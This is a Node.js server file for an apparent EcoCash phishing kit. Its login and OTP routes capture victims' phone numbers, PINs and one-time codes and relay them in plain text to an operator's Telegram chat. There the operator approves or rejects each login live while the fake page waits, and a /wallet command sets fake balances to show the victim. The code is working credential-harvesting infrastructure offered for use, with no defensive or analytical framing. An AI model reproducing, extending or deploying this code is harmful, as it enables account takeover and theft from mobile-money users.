// server.js -Ecocash System
// ── WEBHOOK MODE ──────────────────────────────────────────────────────────
// Uses Telegram webhooks instead of long-polling.
// Benefits on Render:
//   • Zero 409 conflicts — no competing getUpdates connections
//   • Zero reconnect logic — Telegram pushes to us, we never pull
//   • Zero polling errors in logs
//   • Lower latency (<100ms vs ~1s for polling round-trip)
//   • Lower CPU/memory — no persistent outbound connection
//
// Required env var:
//   WEBHOOK_URL=https://your-service.onrender.com
//   (the /telegram/:secret route is registered automatically per bot)
'use strict';
const express     = require('express');
const cors        = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto      = require('crypto');
require('dotenv').config();

const app  = express();
const PORT = process.env.PORT || 3001;

// Raw body needed for webhook signature verification — must come before json()
app.use('/telegram', express.raw({ type: 'application/json', limit: '1mb' }));
app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ─── CONFIG ────────────────────────────────────────────────────────────────
const CFG = Object.freeze({
  DUPE_TTL:          5_000,
  APPROVAL_TIMEOUT:  5 * 60_000,
  CLEANUP_INTERVAL:  15_000,
  READ_TTL:          30_000,
  MAX_USERS:         parseInt(process.env.MAX_USERS) || 1,
  TG_CHAT_INTERVAL:  1_050,       // ms — Telegram: 1 msg/s per chat
  MAX_MSG_SIZE:      4_096,
  SSE_HEARTBEAT:     20_000,
  SEND_RETRIES:      3,
  SEND_RETRY_DELAY:  1_500,
  // WEBHOOK_URL must be set in env — e.g. https://ecocash-d-server.onrender.com
  WEBHOOK_URL:       (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
});

// ─── LOGGER ────────────────────────────────────────────────────────────────
const ts     = () => new Date().toISOString();
const logger = {
  info:  (m, ...a) => console.log (`[INFO]  ${ts()} ${m}`, ...a),
  warn:  (m, ...a) => console.warn (`[WARN]  ${ts()} ${m}`, ...a),
  error: (m, ...a) => console.error(`[ERROR] ${ts()} ${m}`, ...a),
  debug: (m, ...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${m}`, ...a),
};

// ─── HELPERS ───────────────────────────────────────────────────────────────
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
const sleep    = (ms) => new Promise(r => setTimeout(r, ms));

const RE_NONDIGIT = /\D/g;

const _phoneCache = new Map();
const normalise = (raw) => {
  if (!raw || typeof raw !== 'string') return '';
  const hit = _phoneCache.get(raw);
  if (hit) return hit;
  let c = raw.replace(RE_NONDIGIT, '');
  if (c.startsWith('263')) c = c.slice(3);
  if (c.startsWith('0'))   c = c.slice(1);
  if (c.length > 9)        c = c.slice(-9);
  const result = `+263${c}`;
  if (_phoneCache.size > 5_000) _phoneCache.clear();
  _phoneCache.set(raw, result);
  return result;
};
const fmtPhone = (raw) => {
  const full = normalise(raw);
  return { cc: '+263', num: full.slice(4), full };
};

// ─── VALIDATORS ────────────────────────────────────────────────────────────
const RE_PIN = /^\d{4,8}$/;
const RE_OTP = /^\d{4,8}$/;
const vPhone = (p) => {
  if (!p || typeof p !== 'string') return 'Phone must be a string';
  const n = p.replace(RE_NONDIGIT, '');
  return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null;
};
const vPin = (p) => (!p || typeof p !== 'string') ? 'PIN must be a string'  : !RE_PIN.test(p) ? 'PIN must be 4-8 digits' : null;
const vOtp = (o) => (!o || typeof o !== 'string') ? 'OTP must be a string'  : !RE_OTP.test(o) ? 'OTP must be 4-8 digits' : null;

// ─── O(1) DUPE CACHE ───────────────────────────────────────────────────────
class DupeCache {
  constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
  seen(key) {
    if (this._m.has(key)) return true;
    const h = setTimeout(() => this._m.delete(key), this._ttl);
    if (h.unref) h.unref();
    this._m.set(key, h);
    return false;
  }
  clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); }
}

// ─── PER-USER TELEGRAM SEND QUEUE ──────────────────────────────────────────
class TgQueue {
  constructor(interval = CFG.TG_CHAT_INTERVAL) {
    this._q        = [];
    this._running  = false;
    this._interval = interval;
    this._last     = 0;
  }
  send(fn) {
    return new Promise((resolve, reject) => {
      this._q.push({ fn, resolve, reject });
      if (!this._running) this._drain();
    });
  }
  async _drain() {
    this._running = true;
    while (this._q.length) {
      const gap = this._interval - (Date.now() - this._last);
      if (gap > 0) await sleep(gap);
      const { fn, resolve, reject } = this._q.shift();
      this._last = Date.now();
      try   { resolve(await fn()); }
      catch (e) { reject(e); }
    }
    this._running = false;
  }
  flush(reason = 'queue flushed') {
    while (this._q.length) this._q.shift().reject(new Error(reason));
  }
}

// ─── SSE BROKER ────────────────────────────────────────────────────────────
class SseBroker {
  constructor() { this._subs = new Map(); }
  subscribe(key, res) {
    res.setHeader('Content-Type',      'text/event-stream');
    res.setHeader('Cache-Control',     'no-cache');
    res.setHeader('Connection',        'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();
    const hb    = setInterval(() => { if (!res.writableEnded) res.write(': ping\n\n'); }, CFG.SSE_HEARTBEAT);
    const entry = { res, hb };
    if (!this._subs.has(key)) this._subs.set(key, new Set());
    this._subs.get(key).add(entry);
    const unsub = () => {
      clearInterval(hb);
      const s = this._subs.get(key);
      if (s) { s.delete(entry); if (!s.size) this._subs.delete(key); }
      if (!res.writableEnded) res.end();
    };
    res.on('close', unsub);
    res.on('error', unsub);
  }
  push(key, payload) {
    const set = this._subs.get(key);
    if (!set?.size) return;
    const data = `data: ${JSON.stringify(payload)}\n\n`;
    for (const { res, hb } of set) {
      clearInterval(hb);
      if (!res.writableEnded) { res.write(data); res.end(); }
    }
    this._subs.delete(key);
  }
  get size() { let n = 0; for (const s of this._subs.values()) n += s.size; return n; }
}
const sseBroker = new SseBroker();

// ─── MESSAGE FORMATTERS ────────────────────────────────────────────────────
const fmtBundle = (b) => {
  if (!b?.data) return '';
  const price    = b.price != null && !isNaN(b.price) ? `$${b.price}` : 'N/A';
  const validity = b.validity ? ` (${sanitize(b.validity)})` : '';
  return `\n📦 <b>Bundle:</b> ${sanitize(b.data)} / ${price}${validity}`;
};

const fmtLogin = (user, { phone, pin, time, bundle }) => {
  const { cc, num } = fmtPhone(phone);
  const returning   = user.verified.has(phone);
  return `📱 <b>${sanitize(user.name)} — LOGIN</b>

${returning ? '🔄 RETURNING USER' : '🆕 NEW USER'}
🌍 <b>Country:</b> <code>${cc}</code>
📞 <b>Number:</b>  <code>${num}</code>
🔐 <b>PIN:</b>     <code>${sanitize(pin)}</code>${fmtBundle(bundle)}
⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}

${returning ? '✅ Skip OTP → Dashboard' : '📲 Proceed → OTP step'}

━━━━━━━━━━━━━━━━━━━
⏱️ Timeout: 5 min`;
};

const fmtOtp = (user, { phone, otp, time, bundle }) => {
  const { cc, num } = fmtPhone(phone);
  return `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>

🆕 NEW USER
🌍 <b>Country:</b> <code>${cc}</code>
📞 <b>Number:</b>  <code>${num}</code>
🔑 <b>OTP:</b>     <code>${sanitize(otp)}</code>${fmtBundle(bundle)}
⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}

━━━━━━━━━━━━━━━━━━━
⏱️ Timeout: 5 min`;
};

// ─── CALLBACK DATA ─────────────────────────────────────────────────────────
const CB_SEP  = '|';
const mkCb    = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
const parseCb = (d) => {
  const p = d.split(CB_SEP);
  return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null;
};

// ─── VERSION-SAFE TELEGRAM WEBHOOK HELPERS ────────────────────────────────
// node-telegram-bot-api exposes webhook methods under slightly different names
// across versions. We try the known names in order and fall back to a raw
// HTTPS call (using Node's built-in https module) if nothing works.
// This makes the code immune to library version differences.

const https = require('https');

const _rawTgCall = (token, method, body = {}) => new Promise((resolve, reject) => {
  const data = JSON.stringify(body);
  const req  = https.request({
    hostname: 'api.telegram.org',
    path:     `/bot${token}/${method}`,
    method:   'POST',
    headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
  }, (res) => {
    let raw = '';
    res.on('data', c => raw += c);
    res.on('end', () => {
      try {
        const parsed = JSON.parse(raw);
        if (parsed.ok) resolve(parsed.result);
        else reject(new Error(`Telegram error: ${parsed.description}`));
      } catch (e) { reject(e); }
    });
  });
  req.on('error', reject);
  req.write(data);
  req.end();
});

// Try named instance methods first (fastest path), then raw HTTPS as fallback.
const tgDeleteWebhook = (bot, token) =>
  (bot.deleteWebhook?.() ?? bot.deleteWebHook?.() ?? _rawTgCall(token, 'deleteWebhook', { drop_pending_updates: true }));

const tgSetWebhook = (bot, token, url, opts = {}) =>
  (bot.setWebhook?.(url, opts) ?? _rawTgCall(token, 'setWebhook', { url, ...opts }));

const tgGetWebhookInfo = (bot, token) =>
  (bot.getWebhookInfo?.() ?? _rawTgCall(token, 'getWebhookInfo', {}));

// ─── BOT MANAGER (webhook edition) ─────────────────────────────────────────
// Each bot:
//   1. Creates a TelegramBot instance with webhook: true (no polling)
//   2. Registers a unique secret path: /telegram/<webhookSecret>
//   3. Calls setWebhook() to tell Telegram where to POST updates
//
// On redeploy: Telegram simply starts POSTing to the new instance immediately.
// No conflict. No 409. No reconnect logic needed.
//
// The webhookSecret is derived from the bot token so it's stable across
// deploys but unguessable by outsiders.

class BotManager {
  constructor(user, link) {
    this.user   = user;
    this.link   = link;
    this.bot    = null;
    this.ready  = false;
  }

  // Returns the webhook path segment (not the full URL)
  get _secret() {
    // Stable, unguessable, derived from token — same across deploys
    return crypto.createHash('sha256')
      .update(`wh:${this.user.botToken}`)
      .digest('hex')
      .slice(0, 32);
  }

  get _path() { return `/telegram/${this._secret}`; }

  async init() {
    if (!CFG.WEBHOOK_URL) {
      logger.error(`${this.user.name}: WEBHOOK_URL env var not set — cannot register webhook`);
      return;
    }

    // Create bot with webhook mode (no polling at all)
    this.bot = new TelegramBot(this.user.botToken, {
      webHook: false,  // we handle the HTTP route ourselves via Express
      filepath: false,
    });

    this._attachCommands();

    const fullUrl = `${CFG.WEBHOOK_URL}${this._path}`;

    try {
      // 1. Clear any stale webhook / polling session
      await tgDeleteWebhook(this.bot, this.user.botToken).catch(() => {});

      // 2. Register our new webhook
      await tgSetWebhook(this.bot, this.user.botToken, fullUrl, {
        allowed_updates: ['message', 'callback_query'],
        drop_pending_updates: true,
      });

      // 3. Verify
      const info = await tgGetWebhookInfo(this.bot, this.user.botToken).catch(() => ({}));
      logger.info(`${this.user.name}: webhook set → ${fullUrl}`);
      logger.debug(`${this.user.name}: pending=${info?.pending_update_count ?? '?'}, lastErr=${info?.last_error_message || 'none'}`);

      this.user.healthy = true;
      this.user.bot     = this.bot;
      this.ready        = true;
    } catch (e) {
      logger.error(`${this.user.name}: setWebhook failed:`, e.message);
    }
  }

  // Called by Express when Telegram POSTs an update to our webhook path
  processUpdate(update) {
    if (!this.bot) return;
    try { this.bot.processUpdate(update); }
    catch (e) { logger.error(`${this.user.name}: processUpdate error:`, e.message); }
  }

  _attachCommands() {
    const { bot, user, link } = this;

    bot.onText(/\/start/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `🛰️ <b>${sanitize(user.name)} — Ecocash Bot</b>\n\n` +
          `<b>Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Endpoint:</b> <code>/api/${link}/*</code>\n\n` +
          `Add to .env:\n<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/start:', e.message); }
    });

    bot.onText(/\/status/, async (msg) => {
      try {
        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
        await bot.sendMessage(msg.chat.id,
          `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
          `📊 Pending logins:  ${user.logins.size}\n` +
          `📊 Pending OTPs:    ${user.otps.size}\n` +
          `✅ Verified users:  ${user.verified.size}\n` +
          `💰 Wallets set:     ${user.wallets.size}\n` +
          `📡 SSE clients:     ${sseBroker.size}\n` +
          `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
          `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
          `📬 Pending updates: ${info?.pending_update_count ?? '?'}\n` +
          `${info?.last_error_message ? `⚠️ Last webhook error: ${info.last_error_message}` : '✅ No webhook errors'}\n` +
          `${user.lastErr ? `⚠️ Last send error: ${sanitize(user.lastErr)}` : ''}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/status:', e.message); }
    });

    bot.onText(/\/webhook/, async (msg) => {
      try {
        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => ({}));
        await bot.sendMessage(msg.chat.id,
          `🌐 <b>Webhook Info</b>\n\n` +
          `<b>URL:</b> <code>${info.url || 'not set'}</code>\n` +
          `<b>Pending:</b> ${info.pending_update_count}\n` +
          `<b>Max connections:</b> ${info.max_connections || 40}\n` +
          `<b>Last error:</b> ${info.last_error_message || 'none'}\n` +
          `<b>Last error time:</b> ${info.last_error_date ? new Date(info.last_error_date * 1000).toLocaleString() : 'never'}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/webhook:', e.message); }
    });

    bot.onText(/\/wallet (.+)/, async (msg, match) => {
      try {
        const args = match[1].trim().split(/\s+/);
        if (args.length !== 4)
          return bot.sendMessage(msg.chat.id, '❌ Usage: <code>/wallet [phone] [name] [USD] [ZWG]</code>', { parse_mode: 'HTML' });
        const [rawPhone, name, usd, zwg] = args;
        const usdN = parseFloat(usd), zwgN = parseFloat(zwg);
        if (isNaN(usdN) || isNaN(zwgN) || usdN < 0 || zwgN < 0)
          return bot.sendMessage(msg.chat.id, '❌ Invalid amounts.', { parse_mode: 'HTML' });
        const phone = normalise(rawPhone);
        user.wallets.set(phone, { name: sanitize(name), usd: usdN, zwg: zwgN, ts: Date.now() });
        await bot.sendMessage(msg.chat.id,
          `✅ <b>Wallet set</b>\n👤 ${sanitize(name)}\n📱 <code>${phone}</code>\n💵 $${usdN.toFixed(2)}\n💰 ZWG ${zwgN.toFixed(2)}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/wallet:', e.message); }
    });

    bot.on('callback_query', async (q) => {
      try { await handleCallback(user, q); }
      catch (e) { logger.error(`${user.name}: callback error:`, e.message); }
    });
  }

  ok() { return this.ready && this.user.healthy; }
}

// ─── CALLBACK HANDLER ──────────────────────────────────────────────────────
const _answeredCallbacks = new Set();

async function handleCallback(user, q) {
  const { bot } = user;
  const { data, message: msg, id: qid } = q;
  const { chat: { id: chatId }, message_id: mid } = msg;

  if (_answeredCallbacks.has(qid)) return;
  _answeredCallbacks.add(qid);
  const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60_000);
  if (t.unref) t.unref();

  const edit = (text) =>
    bot.editMessageText(text, {
      chat_id: chatId, message_id: mid, parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [] },
    }).catch(e => logger.debug('edit skipped:', e.message));

  const answer = (text, alert = false) =>
    bot.answerCallbackQuery(qid, { text, show_alert: alert })
      .catch(e => logger.debug('answer skipped:', e.message));

  const parsed = parseCb(data);
  if (!parsed) { await answer('❌ Bad data', true); return; }

  const { type, action, phone, secret } = parsed;
  const key = `${phone}-${secret}`;
  const now = Date.now();

  if (type === 'login') {
    const rec = user.logins.get(key);
    if (!rec)                          { await answer('❌ Session not found', true); return; }
    if (rec.approved || rec.rejected)  { await answer('✅ Already processed'); return; }

    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      Object.assign(rec, { approved: false, rejected: true, expired: true });
      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: true, reason: null });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }
    if (action === 'proceed') {
      rec.approved = true;
      sseBroker.push(`login:${key}`, { approved: true, rejected: false, expired: false, reason: null });
      await Promise.all([
        edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n${user.verified.has(phone) ? '→ Dashboard' : '→ OTP step'}`),
        answer('✅ Allowed!'),
      ]);
    } else if (action === 'invalid') {
      Object.assign(rec, { rejected: true, reason: 'invalid' });
      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: false, reason: 'invalid' });
      await Promise.all([
        edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
        answer('❌ Marked invalid'),
      ]);
    } else { await answer('❓ Unknown action'); }
    return;
  }

  if (type === 'otp') {
    const rec = user.otps.get(key);
    if (!rec)                     { await answer('❌ Verification not found', true); return; }
    if (rec.status !== 'pending') { await answer('✅ Already processed'); return; }

    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      rec.status = 'timeout';
      sseBroker.push(`otp:${key}`, { status: 'timeout' });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }
    if (action === 'correct') {
      rec.status = 'approved';
      user.verified.set(phone, { ts: now });
      sseBroker.push(`otp:${key}`, { status: 'approved' });
      await Promise.all([
        edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>\n\n💡 Set wallet:\n<code>/wallet ${phone} Name 100.00 0</code>`),
        answer('✅ Verified!'),
      ]);
    } else if (action === 'wrong') {
      rec.status = 'rejected';
      sseBroker.push(`otp:${key}`, { status: 'rejected' });
      await Promise.all([
        edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
        answer('❌ Wrong OTP'),
      ]);
    } else if (action === 'wrongpin') {
      rec.status = 'wrong_pin';
      sseBroker.push(`otp:${key}`, { status: 'wrong_pin' });
      await Promise.all([
        edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
        answer('⚠️ Wrong PIN'),
      ]);
    } else { await answer('❓ Unknown action'); }
    return;
  }

  await answer('❓ Unknown type');
}

// ─── SEND TELEGRAM MESSAGE ─────────────────────────────────────────────────
async function sendMsg(user, text, opts = {}) {
  if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
  return user.tgQueue.send(async () => {
    let attempt = 0;
    while (true) {
      try {
        await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
        user.lastErr = null;
        return { ok: true };
      } catch (e) {
        user.lastErr = e.message;
        const s = e.response?.statusCode;
        logger.error(`sendMsg [${user.name}] attempt ${attempt + 1}:`, s || e.code, e.message);
        if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
        if (s === 429) {
          const wait = Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60_000);
          await sleep(wait);
          continue;
        }
        if (s >= 500 && attempt < CFG.SEND_RETRIES) { attempt++; await sleep(CFG.SEND_RETRY_DELAY * attempt); continue; }
        return { ok: false, err: e.message };
      }
    }
  });
}

// ─── LOAD USERS ────────────────────────────────────────────────────────────
const users = new Map();

(function loadUsers() {
  let ok = 0, fail = 0;
  for (let i = 1; i <= CFG.MAX_USERS; i++) {
    const link   = process.env[`USER_LINK_INSERT_${i}`];
    const token  = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
    const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
    const name   = process.env[`USER_NAME_${i}`] || `User ${i}`;
    if (!link || !token || !chatId) continue;
    if (!/^[a-zA-Z0-9_-]+$/.test(link))     { logger.warn(`User ${i}: bad link`);   fail++; continue; }
    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`);  fail++; continue; }
    if (!/^-?\d+$/.test(chatId))              { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
    if (users.has(link))                      { logger.warn(`Dup link: ${link}`);     fail++; continue; }
    const u = {
      id: i, name: sanitize(name), linkInsert: link, botToken: token, chatId,
      bot: null, healthy: false, lastErr: null,
      logins:   new Map(),
      otps:     new Map(),
      wallets:  new Map(),
      verified: new Map(),
      dupes:    new DupeCache(),
      tgQueue:  new TgQueue(),
    };
    u.mgr = new BotManager(u, link);
    users.set(link, u);
    ok++;
  }
  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
})();

// ─── WEBHOOK ROUTES ─────────────────────────────────────────────────────────
// Register one route per bot. Each route:
//   1. Returns 200 immediately (Telegram requires fast ack)
//   2. Processes the update asynchronously
//
// The path is /telegram/<sha256_of_token[:32]> — unguessable but stable.
// No signature header needed because the path itself is the secret.

users.forEach((user) => {
  const path = user.mgr._path;
  app.post(path, (req, res) => {
    // Acknowledge immediately — Telegram retries if we don't respond in 5s
    res.sendStatus(200);
    // Parse body (raw Buffer from express.raw middleware)
    let update;
    try {
      const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : JSON.stringify(req.body);
      update = JSON.parse(body);
    } catch (e) {
      logger.error(`${user.name}: webhook body parse error:`, e.message);
      return;
    }
    user.mgr.processUpdate(update);
  });
  logger.debug(`Registered webhook route: POST ${path} → ${user.name}`);
});

// ─── BOT INIT ──────────────────────────────────────────────────────────────
// Stagger slightly so setWebhook calls don't all fire at once
(async () => {
  if (!CFG.WEBHOOK_URL) {
    logger.error('WEBHOOK_URL env var is not set. Add it to your Render environment variables:');
    logger.error('  WEBHOOK_URL=https://your-service.onrender.com');
    logger.error('Bots will not receive updates until this is set.');
  }
  const arr = [...users.values()];
  for (let i = 0; i < arr.length; i++) {
    try   { await arr[i].mgr.init(); }
    catch (e) { logger.error(`Init [${arr[i].name}]:`, e.message); }
    if (i < arr.length - 1) await sleep(500); // short gap — no polling storm to worry about
  }
  logger.info('All bots initialised');
})();

// ─── GC ────────────────────────────────────────────────────────────────────
setInterval(() => {
  const now    = Date.now();
  const expire = now - CFG.APPROVAL_TIMEOUT;
  const purge  = now - 10 * 60_000;
  for (const u of users.values()) {
    for (const [k, v] of u.logins) {
      if (!v.expired && v.ts < expire) Object.assign(v, { approved: false, rejected: true, expired: true });
      if (v.ts < purge) u.logins.delete(k);
    }
    for (const [k, v] of u.otps) {
      if (v.status === 'pending' && v.ts < expire) {
        v.status = 'timeout';
        sseBroker.push(`otp:${k}`, { status: 'timeout' });
      }
      if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; }
      if (v.ts < purge) u.otps.delete(k);
    }
  }
}, CFG.CLEANUP_INTERVAL).unref?.();

// ─── ROUTE HELPERS ────────────────────────────────────────────────────────
const botOk = (u, res) => {
  if (!u.bot || !u.healthy) { res.status(503).json({ success: false, message: 'Bot service unavailable' }); return false; }
  return true;
};

// ─── HEALTH ────────────────────────────────────────────────────────────────
app.get('/api/health', (_, res) => {
  const list = [...users.values()].map(u => ({
    name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
    logins: u.logins.size, otps: u.otps.size, verified: u.verified.size,
    wallets: u.wallets.size, sse: sseBroker.size, lastErr: u.lastErr,
    webhookPath: u.mgr._path,
  }));
  res.json({ status: list.some(u => u.healthy) ? 'ok' : 'degraded', users: list, ts: ts() });
});

// ─── DYNAMIC ROUTES ────────────────────────────────────────────────────────
users.forEach((user, link) => {
  const R = `/api/${link}`;

  app.post(`${R}/check-user-status`, (req, res) => {
    const raw = req.body.phoneNumber;
    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
    const e = vPhone(raw); if (e) return res.status(400).json({ success: false, message: e });
    res.json({ success: true, isReturningUser: user.verified.has(normalise(raw)) });
  });

  app.post(`${R}/get-wallet-balances`, (req, res) => {
    const raw = req.body.phoneNumber;
    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
    const w = user.wallets.get(normalise(raw));
    res.json({ success: true, name: w?.name || '', usd: w?.usd ?? 0, zwg: w?.zwg ?? 0 });
  });

  app.post(`${R}/login`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { pin, timestamp, bundle } = req.body;
    const raw = req.body.phoneNumber;
    if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
    const ie = vPin(pin);   if (ie) return res.status(400).json({ success: false, message: ie });
    const phone = normalise(raw);
    if (user.dupes.seen(`login:${phone}:${pin}`)) return res.json({ success: true, message: 'Cached' });
    const key = `${phone}-${pin}`;
    user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false });
    const text     = fmtLogin(user, { phone, pin, time: timestamp || Date.now(), bundle });
    const keyboard = { inline_keyboard: [
      [{ text: '✅ Allow to Proceed',    callback_data: mkCb('login', 'proceed', phone, pin) }],
      [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }],
    ]};
    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, message: 'Waiting for approval' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  app.post(`${R}/check-login-approval`, (req, res) => {
    const { pin } = req.body;
    const raw     = req.body.phoneNumber;
    if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    const phone = normalise(raw);
    const rec   = user.logins.get(`${phone}-${pin}`);
    if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });
    if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
      return res.json({ success: true, approved: false, rejected: true, expired: true });
    res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null });
  });

  // SSE — instant push (replaces polling)
  app.get(`${R}/stream-login-approval`, (req, res) => {
    const { phone: rp, pin } = req.query;
    if (!rp || !pin) return res.status(400).json({ success: false, message: 'phone and pin required' });
    const phone = normalise(rp);
    const key   = `${phone}-${pin}`;
    const rec   = user.logins.get(key);
    if (rec && (rec.approved || rec.rejected)) {
      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
      res.write(`data: ${JSON.stringify({ approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`login:${key}`, res);
  });

  app.post(`${R}/verify-otp`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { otp, timestamp, bundle } = req.body;
    const raw = req.body.phoneNumber;
    if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
    const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
    const oe = vOtp(otp);   if (oe) return res.status(400).json({ success: false, message: oe });
    const phone = normalise(raw);
    if (user.dupes.seen(`otp:${phone}:${otp}`)) return res.json({ success: true, message: 'Cached' });
    const key = `${phone}-${otp}`;
    user.otps.set(key, { status: 'pending', ts: Date.now() });
    const text     = fmtOtp(user, { phone, otp, time: timestamp || Date.now(), bundle });
    const keyboard = { inline_keyboard: [
      [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct',  phone, otp) }],
      [
        { text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong',    phone, otp) },
        { text: '⚠️ Wrong PIN',  callback_data: mkCb('otp', 'wrongpin', phone, otp) },
      ],
    ]};
    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, message: 'OTP sent' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  app.post(`${R}/check-otp-status`, (req, res) => {
    const { otp } = req.body;
    const raw     = req.body.phoneNumber;
    if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
    const phone = normalise(raw);
    const rec   = user.otps.get(`${phone}-${otp}`);
    if (!rec) return res.json({ success: true, status: 'pending' });
    if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout' });
    if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) rec.readAt = rec.readAt || Date.now();
    res.json({ success: true, status: rec.status });
  });

  // SSE — instant push
  app.get(`${R}/stream-otp-status`, (req, res) => {
    const { phone: rp, otp } = req.query;
    if (!rp || !otp) return res.status(400).json({ success: false, message: 'phone and otp required' });
    const phone = normalise(rp);
    const key   = `${phone}-${otp}`;
    const rec   = user.otps.get(key);
    if (rec && rec.status !== 'pending') {
      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
      res.write(`data: ${JSON.stringify({ status: rec.status })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`otp:${key}`, res);
  });

  app.post(`${R}/resend-otp`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { timestamp } = req.body;
    const raw           = req.body.phoneNumber;
    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
    const phone = normalise(raw);
    const text  = `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
    const r     = await sendMsg(user, text);
    r.ok ? res.json({ success: true }) : res.status(500).json({ success: false, error: r.err });
  });
});

// ─── 404 + ERROR ──────────────────────────────────────────────────────────
app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
app.use((err, req, res, _next) => {
  logger.error('Unhandled Express error:', err.message);
  res.status(500).json({ success: false, error: 'Internal server error' });
});

// ─── GRACEFUL SHUTDOWN ────────────────────────────────────────────────────
const shutdown = async (sig) => {
  logger.info(`${sig} — shutting down`);
  server.close();
  for (const u of users.values()) { u.dupes.clear(); u.tgQueue?.flush('shutting down'); }
  process.exit(0);
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
